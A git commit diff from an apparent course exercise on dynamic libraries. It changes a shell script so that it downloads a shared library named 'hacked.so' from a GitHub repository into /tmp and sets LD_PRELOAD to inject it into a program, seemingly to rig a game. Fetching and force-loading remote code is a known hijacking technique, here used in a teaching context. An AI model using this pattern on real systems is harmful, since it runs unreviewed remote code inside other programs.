f90c821bd283ffaf00014540252c8161759c87e2
meliance <melakmu66@gmail.com>
2024-01-16 00:20:53 +0300

    updated

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -q --output-document=$HOME/lib101-gm_overhaul.so https://github.com/bekalue/alx-low_level_programming/blob/master/0x18-dynamic_libraries/lib101-gm_overhaul.so
-export LD_PRELOAD=$HOME/lib101-gm_overhaul.so
+wget -P /tmp https://github.com/NwabuezeFranklin/alx-low_level_programming/raw/main/0x18-dynamic_libraries/hacked.so
+export LD_PRELOAD=/tmp/hacked.so
